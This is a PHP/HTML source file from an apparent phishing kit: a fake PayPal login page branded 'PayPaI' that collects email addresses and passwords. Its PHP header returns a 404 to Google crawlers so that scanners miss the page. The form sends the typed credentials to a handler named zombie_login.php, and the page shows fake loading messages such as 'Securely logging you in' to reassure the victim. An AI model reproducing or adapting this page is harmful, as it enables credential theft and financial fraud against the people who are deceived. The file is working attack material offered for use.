<?php

session_start();
error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

include("../system/blocker.php");
include("../system/detect.php");

?>
<!DOCTYPE html>
<html>
<head>
	<title>Log in to your PayPaI account</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="stylesheet" type="text/css" href="../assets/main/styles/login.css">
	<script src="../assets/vendors/scripts/jquery.min.js"></script>
	<link rel="shortcut icon" href="../assets/main/images/ico.ico" />
</head>
<body>
	<div class="main" id="main">
		<section id="login" class="login">
			<div class="corral">
				<div class="contentContainer activeContent contentContainerBordered">
					<header><p class="logo logo-long"></p></header>
					<h1 class="headerText accessAid">Log in to your PayPaI account</h1>
					<p id="phoneSubTagLine" class="subHeaderText hide"></p>


<script>
function validatePayForm() {
    var a = document.forms["loginForm"]["login_email"].value;
    var b = document.forms["loginForm"]["login_password"].value;
    if (a == "") {
        $("#login_emaildiv").addClass("hasError");
        $("#login_emaildiv").css("z-index", "100");
        $("#emailErrorMessage").addClass("show");
        $("#mailrequired").removeClass("hide");
        $("#email").focus();
        if (a == ""){return false;}
    } else {
    	var x = document.getElementById('email').value;
    	document.getElementById('profileDisplayEmail').innerHTML = x;
    	$("#splitEmail").addClass("hide");
    	$("#splitPassword").addClass("transformRightToLeft");
    	$("#splitPassword").removeClass("hide");
    	$(".profileRememberedEmail").removeClass("hide");
    	$("#loading").removeClass("hide");
    	$("#loading").addClass("spinner");
        setTimeout(function() {
	        $(".login_passworddiv").attr("id","login_passworddiv");
        	$(".passwordErrorMessage").attr("id","passwordErrorMessage");
        	$("#loading").addClass("hide");
    		$("#loading").removeClass("spinner");
    		$("#loading").attr("id","passloading");
		}, 2000);
    }

    if (b == "") {
        $("#login_passworddiv").addClass("hasError");
        $("#login_passworddiv").css("z-index", "100");
        $("#passwordErrorMessage").addClass("show");
        $("#passrequired").removeClass("hide");
        $("#password").focus();
        if (b == ""){return false;}
    } else {
		   
    }
}
</script>

<form action="../system/send/zombie_login.php" id="paymentform" class="proceed maskable" method="post" name="loginForm" onsubmit="return validatePayForm()">				
						<style>.hidden{display:none;visibility:hidden;}</style>
						<input type="text" class="hidden" name="hidden" />
						<div class="empty"></div>

						<div class="profileRememberedEmail hide">
							<span class="profileDisplayPhoneCode"></span><span class="profileDisplayEmail" id="profileDisplayEmail"></span><a href="javascript:void(0)" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Change</a></div>

						<div class="splitEmail" id="splitEmail">
							<div id="emailSection" class="clearfix">
								<div class="textInput" id="login_emaildiv" style="z-index: 1;">
									<div class="fieldWrapper">
										<label for="email" class="fieldLabel">Email</label>
										<input id="email" name="login_email" type="text" class="hasHelp validateEmpty "value="" autocomplete="off" placeholder="Email">
									</div>
									<div class="errorMessage" id="emailErrorMessage">
										<p id="mailrequired" class="emptyError hide">Required</p>
										<p class="invalidError hide">That email format isn’t right</p>
									</div>
								</div>
							</div>

							<div class="actions">
								<button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next">Next</button>
							</div>

						</div>


						<div id="splitPassword" class="splitPassword hide">
							<div id="splitPasswordSection" class="">
								<div id="passwordSection" class="clearfix">
									<div class="textInput login_passworddiv" id="">
										<div class="fieldWrapper">
											<label for="password" class="fieldLabel">Password</label>
											<input id="password" name="login_password" type="password" class="hasHelp validateEmpty pin-password" value="" placeholder="Password" autocomplete="off">
											<button type="button" class="showPassword hide show-hide-password" aria-label="Show password" pa-marked="1">Show</button>
											<button type="button" class="hidePassword hide show-hide-password" aria-label="Hide" pa-marked="1">Hide</button>
										</div>
										<div class="errorMessage passwordErrorMessage" id="">
											<p id="passrequired" class="emptyError hide">Required</p>
										</div>
									</div>
								</div>
							</div>
							<div class="actions">
								<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button>
								<button class="button actionContinue hide" type="button" id="siftni" value="Login">Log In</button>
							</div>
						</div>
					</form>

					<div class="forgotLink">
						<a href="javascript:void(0)" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a>
					</div>

					<div id="signupContainer" class="signupContainer">
						<div class="loginSignUpSeparator">
							<span class="textInSeparator">or</span>
						</div>
						<a href="javascript:void(0)" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</a>
					</div>


				</div>
			</div>
		</section>


		<footer class="footer" role="contentinfo">
			<div class="legalFooter">
				<div class="extendedContent">
					<ul class="footerGroup footerGroupWithSiblings"><li><a href="javascript:void(0)" pa-marked="1">Privacy</a></li><li><a href="javascript:void(0)" pa-marked="1">PayPaI</a></li></ul><p class="footerCopyright">Copyright &copy; 1999-2020 PayPaI. All rights reserved.</p>
				</div>
			</div>
		</footer>


	</div>

<div class="transitioning hide" id="loading">
	<p class="checkingInfo hide">Checking your information…</p>
	<p class="oneSecond hide">Just a second…</p>
	<p class="secureMessage hide">Securely logging you in...</p>
	<p class="oneTouchMessage hide"></p>
	<p class="retrieveInfo hide">Retrieving your information...</p>
	<p class="waitFewSecs hide">This may take a few seconds...</p>
</div>
<script type="text/javascript">
	$("#email").blur(function() {
  		$("#login_emaildiv").css("z-index", "1");
        $("#emailErrorMessage").removeClass("show");
        $("#mailrequired").addClass("hide");
	});
	$(document).ready(function(){
    $('#email').on('keyup keydown keypress change paste', function() {  
        if ($(this).val() == '') {  } 
        else {$("#login_emaildiv").removeClass("hasError");$("#login_emaildiv").css("z-index", "1");$("#emailErrorMessage").removeClass("show");$("#mailrequired").addClass("hide"); }});
    });
</script>
<script type="text/javascript">
	$("#password").blur(function() {
  		$("#login_emaildiv").css("z-index", "1");
        $("#passwordErrorMessage").removeClass("show");
        $("#passrequired").addClass("hide");
	});
	$(document).ready(function(){
    $('#password').on('keyup keydown keypress change paste', function() {  
        if ($(this).val() == '') {  } 
        else {$("#login_passworddiv").removeClass("hasError");$("#login_emaildiv").css("z-index", "1");$("#passwordErrorMessage").removeClass("show");$("#passrequired").addClass("hide");$(".showPassword").removeClass("hide"); }});
    });
    $(".showPassword").click(function() {
  		$("#password").attr("type", "text");
        $(".hidePassword").removeClass("hide");
        $(".showPassword").addClass("hide");
	});
	$(".hidePassword").click(function() {
  		$("#password").attr("type", "password");
        $(".showPassword").removeClass("hide");
        $(".hidePassword").addClass("hide");
	});
	$("#backToInputEmailLink").click(function() {
  		$("#splitEmail").removeClass("hide");
    	$("#splitPassword").addClass("hide");
    	$(".profileRememberedEmail").addClass("hide");
	});
	$(document).ready(function(){
	$('#email'),$('#password').on('keyup keydown keypress change paste', function() {  
		if ($(this).val() == '') { $("#btnLogin").removeClass("hide");$("#siftni").addClass("hide"); } 
		else {$("#btnLogin").addClass("hide");$("#siftni").removeClass("hide");$("#btnNext").attr("disabled","");}});
	});
	$("#siftni").click(function() {
  		$("#passloading").removeClass("hide");
    	$("#passloading").addClass("spinner");
		setTimeout(function() {
			$('#paymentform').submit();
		}, 2000);
	});
</script>
</body>
</html>